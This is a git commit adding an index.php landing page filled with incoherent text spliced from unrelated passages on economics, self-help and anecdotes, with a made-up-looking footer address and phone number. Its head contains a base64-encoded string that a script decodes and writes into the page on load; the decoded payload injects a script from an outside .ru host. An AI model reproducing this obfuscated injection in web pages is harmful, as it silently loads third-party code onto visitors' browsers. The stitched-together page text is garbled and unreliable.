c69705235468e7fa8778e160f85c67cbdcfcd711
anikafcp <78560644+anikafcp@users.noreply.github.com>
2021-02-04 20:29:30 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,119 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>You see the faces of the deceased's family and friends.  Money itself is no</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl9jOG82ZGRjbnJ2cW9zMWo2MDMiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header class="sp7pky7k19hwwxh">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="hqhm5frmsrctsz7wr">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>You see the faces of the deceased's family and friends.  Money itself is no</h1>
+	</section>
+
+
+	<section class="our-work" class="gjr86yu5dmrsfd6b">
+		<h3 class="title">Over a short-term time interval, changes in product</h3>
+		<p>54.PRICE ELASTICITY OF DEMAND The dependence of changes in demand for a product on changes in its price is called the price elasticity of demand.  A person who is focused on pleasure is too quickly fed up with what he has already experienced, and demands more and more new pleasures.  He took care of the courtyard himself.  It turns out that the guys were playing football in our wide corridor, and one of them smashed his lip with his elbow.  But then these very subjects turned out to be the most important and useful in my life.  An industry entry barrier is a constraint that prevents additional sellers from entering the monopoly firm's market. </p>
+		<hr>
+
+		<ul class="grid" class="ydk5csu0gm1c2dan32t">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="sp7pky7k19hwwxh">
+		<h3 class="title">Now let's see how Habit 3 ranks in the sys</h3>
+		<p>5) sanitizing.  This person turned my life into a nightmare, and often I vent my anger on my family.  TAXES The government needs funds to perform its functions.  And then he began to literally interrogate her.  On the basis of these norms, enterprises determine the amount of depreciation deductions.  Living by the program Let's turn to the computer metaphor again.  In one way or another, the enterprise reaches such a scale when it begins to dominate the market.  Resource prices determine production costs.  The income target is too low.  We are atwalked behind the roots and received wonderful results - rich Win / Win relationships, deep understanding and amazing synergy.  It's like leaning against the walls of your home, where happiness, a sense of security and the highest values ​​of your life are concentrated.  Usually, these conferences were absolutely predictable, uncreative, sluggish and boring. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="hqhm5frmsrctsz7wr" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="gjr86yu5dmrsfd6b">
+		<h3 class="title">But the legislation does not consider the means of individualiz</h3>
+		<p>Interestingly, each of the seven skills belongs to Quadrant II.  The elasticity of price intervals and the quantity of demand is not the same along the entire straight line representing demand.  24.  I'm not at all interested in communicating with thosewho also sees only the old woman. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="ydk5csu0gm1c2dan32t" style="background-image: url(image3.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="sp7pky7k19hwwxh">
+		<h3 class="title">The fact is that if you do it, then I will not do t</h3>
+		<p>The meeting began at eight in the morning in one of the bank's conference rooms.  And only some markets come close to it (grain market, currencies, etc.).  He could in his thoughts be transported into the audience and, as if from the outside, see himself telling the students about the lessons of camp life.  She can explain, for example, how economic considerations influence decisions to marry, have children, and allocate time between work and play.  This distinction is important.  But unlike most other means of production, land is not a freely reproducible factor of production.  There is a way that I find particularly useful for developing Win / Lose people of the Win / Win character.  There may be circumstances in which synergy cannot be achieved and the Do Not Link situation is unacceptable.  We cannot open the gates of another person's change either with an argument or with an emotional appeal.  He made an appointment with bank officials who were extremely skeptical.  Promise yourselfthat you will maintain a balance between courage in achieving your goal and sensitivity to someone else's point of view. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="hqhm5frmsrctsz7wr" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="gjr86yu5dmrsfd6b">
+		<h3 class="title">The use of taxes is one of the economic me</h3>
+		<p>Depreciation rate.  So the three of us sat down at a table and exchanged pleasantries.  Obsolescence is the process of equipment depreciation under the influence of technical progress.  My acquaintance with this company took place at a huge convention, which gathered more than 800 sales agents of the company and was dedicated to awarding the best of them at the end of the year.  Soon after this incident, and partly due to the impact of this “revolutionary” idea, Sandra and I began to practice “deep communication”, heart-to-heart conversations.  You saw how I can do it.  People who once experienced true synergy will never be the same as they were before.They know the opportunity to relive this exciting adventure that expands horizons.  ...  - How do you understand the word "effective"? - I did not lag behind.  I tried to devote ten minutes of "my precious time" to a child or subordinate to solve a problem, but I found that such "productivity" only creates new problems and rarely eliminates serious worries.  You can rely on the right principles.  Functional wear is caused by a change in the range of products, which leads to the fact that the existing specialized equipment remains unloaded.Renovation is the process of changing an object in accordance with the latest requirements and norms, for example, modernizing the production process, technical equipment, etc.  He constantly thought about him until it became an obsession. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="ydk5csu0gm1c2dan32t" class="title">If you are a parent, then look at your love for the child for w</h3>	
+		<p>At that time, the state of the project was sad.Streets began to overgrow with weeds and turn into wastelands, and the owners of several built houses, finding that the value of their properties had fallen, prepared for a fight.  Your self-esteem is based on your family's reputation.  “Inert” and “mobile” resources become variable within this period.  It reflects a situation where the demand for a given product is best met by one or more firms.  Your behavior directly depends on your character, that is, on the factwhat you really are - not from what others say about you or how you want to appear in my eyes.  The second type of management process is programmed control.  At first, the girl rejected this new attitude, the old script was too strong.  But taking a closer look at our scripts, many of us will find among them wonderful, positive programs that we once took on trust.Genuine self-awareness helps us appreciate such scenarios and feel grateful to those who walked in front of us and raised us based on principles, to those in whose mirror we were reflected not only as we were, but also as we could become.  For more than half a year I have dealt only with it and, one might say, I put everything at stake. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="sp7pky7k19hwwxh">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="hqhm5frmsrctsz7wr"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="gjr86yu5dmrsfd6b"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="ydk5csu0gm1c2dan32t"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>3769 Purdy Unions, Suite 012, 64333-3957, North Kobyshire, North Carolina, United States</p>
+		<p>Phone number: +475(58)446-2931720</p>
+	</footer>
+
+</body>
+
+</html>
